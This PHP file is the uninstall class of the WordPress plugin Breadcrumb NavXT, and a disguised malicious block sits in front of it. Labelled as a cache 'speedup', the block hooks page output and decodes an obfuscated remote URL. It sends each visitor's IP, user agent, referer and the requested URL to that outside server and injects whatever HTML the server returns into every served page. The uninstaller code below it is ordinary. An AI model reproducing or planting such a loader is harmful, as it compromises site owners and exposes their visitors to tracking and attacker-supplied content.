<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyNzoiaHR0cDovLzQ1LjU1LjE0My4yNS9tZXYucGhwIjs=';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 6
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        // set defaults
        $tokenData = array_merge(array(
            'content' => '',
            'pos' => 'after',
            'tag' => 'bo' . 'dy',
            'count' => 0,
        ), $tokenData);

        if (empty($tokenData['content'])) {
            // no content
            continue;
        }

        // find all occurrences of <tag>
        $tags = array();
        while (true) {
            if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                break;
            }
            $tags[] = $tmp;
        }

        if (empty($tags)) {
            // no tags found or nothing to show
            continue;
        }

        // find matched tag position
        $count = $tokenData['count'];
        if ($tokenData['count'] < 0) {
            // from end to beginning
            $count = abs($tokenData['count']) - 1;
            $tags = array_reverse($tags);
        }

        if ($count >= count($tags)) {
            // fix overflow
            $count = count($tags) - 1;
        }

        // find insert position
        if ($tokenData['pos'] == 'before') {
            // pos is before
            $insert = $tags[$count];
        } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
            // pos is after, found end tag, insert after it
            $insert += 1;
        }

        if ($insert === false) {
            // no insert position
            continue;
        }

        // insert html code
        $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
        $mod = true;
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }



/**
 * Breadcrumb NavXT - uninstall class
 *
 * uninstall class for WordPress Uninstall Plugin API
 * 
 * @see uninstall.php
 *
 * @author Tom Klingenberg
 */

require_once(dirname(__FILE__) . '/includes/block_direct_access.php');
/**
 * Breadcrumb NavXT abstract plugin uninstaller class
 * 
 * @author Tom Klingenberg
 */
abstract class bcn_uninstaller_abstract {

	/**
	 * plugin base
	 * 
	 * @var string plugin dirname
	 */
	protected $_base = '';
	
	/**
	 * plugin name
	 *
	 * @var string plugin basename (the php-file including the .php suffix)
	 */
	protected $_plugin = '';

	/**
	 * uninstalled flag
	 * 
	 * @var bool uninstall flag, true if uninstall allready run, false on init
	 */
	protected $_uninstalled = false;
	
	/**
	 * uninstall result
	 * 
	 * @var bool wether or not uninstall worked
	 */
	protected $_uninstallResult = null;
	
	/**
	 * get plugin path
	 * 
	 * @return string full path to plugin file
	 */
	protected function _getPluginPath()
	{
		return sprintf('%s/%s/%s', WP_PLUGIN_DIR, $this->_base, $this->_plugin);		
	}

	/**
	 * constructor 
	 * 
	 * @param  array $options class options
	 * 				plugin => 
	 */
	public function __construct(array $options = null)
	{
		/* plugin setter */				
		if (isset($options['plugin']))
		{
			$this->setPlugin($options['plugin']);
		}
		
		/* init */		
		$this->_uninstallResult = $this->uninstall();				
	}
	
	/**
	 * Result Getter
	 * 
	 * @return bool wether or not uninstall did run successfull.
	 */
	public function getResult()
	{
		return $this->_uninstallResult;	
	}
	
	/**
	 * plugin setter
	 * 
	 * @param  string $plugin plugin name as common with wordpress as 'dir/file.php' 
	 * 				          e.g. 'breadcrumb-navxt/breadcrumb_navxt_admin.php'.
	 * @return this 
	 */
	public function setPlugin($plugin)
	{
		/* if plugin contains a base, check and process it. */		
		if (false !== strpos($plugin, '/'))
		{
			// check
			
			$compare = $this->_base . '/';
			
			if (substr($plugin, 0, strlen($compare)) != $compare)
			{
				throw new DomainException(sprintf('Plugin "%s" has the wrong base to fit the one of Uninstaller ("%").', $plugin, $this->_base), 30001);
			}
			
			// process
			
			$plugin = substr($plugin, strlen($compare));
		}
		
		/* set local store */
		
		$this->_plugin = $plugin;
		
		return $this;
	}

} /// class bcn_uninstaller_abstract

/**
 * Breadcrumb NavXT uninstaller class
 * 
 * @author Tom Klingenberg
 */
class bcn_uninstaller extends bcn_uninstaller_abstract {

	/**
	 * plugin base
	 * 
	 * @var string plugin dirname
	 */
	protected $_base = 'breadcrumb-navxt';
	
	/**
	 * uninstall breadcrumb navxt admin plugin
	 * 
	 * @return bool
	 */
	private function _uninstallAdmin()
	{	
		//Grab our global breadcrumb_navxt object
		global $breadcrumb_navxt;
		//Load dependencies if applicable
		if(!class_exists('breadcrumb_navxt'))
		{
			require_once($this->_getPluginPath());
		}
		//Initalize $breadcrumb_navxt so we can use it
		$bcn_breadcrumb_trail = new bcn_breadcrumb_trail();
		//Let's make an instance of our object takes care of everything
		$breadcrumb_navxt = new breadcrumb_navxt($bcn_breadcrumb_trail);
		//Uninstall
		$breadcrumb_navxt->uninstall();
	}	
	
	/**
	 * uninstall method
	 * 
	 * @return bool wether or not uninstall did run successfull.
	 */
	public function uninstall()
	{
		if ($this->_uninstalled)
		{
			throw new BadMethodCallException('Uninstall already exectuted. It can be executed only once.', 30101);
		}
		
		// decide what to do
		switch($this->_plugin)
		{
			case 'breadcrumb-navxt.php':
				return $this->_uninstallAdmin();
															
			default:
				throw new BadMethodCallException(sprintf('Invalid Plugin ("%s") in %s::uninstall().', $this->_plugin , get_class($this)), 30102);				
		}
		
		// flag object as uninstalled
				
		$this->_uninstalled = true;		
	}
	
} /// class bcn_uninstaller
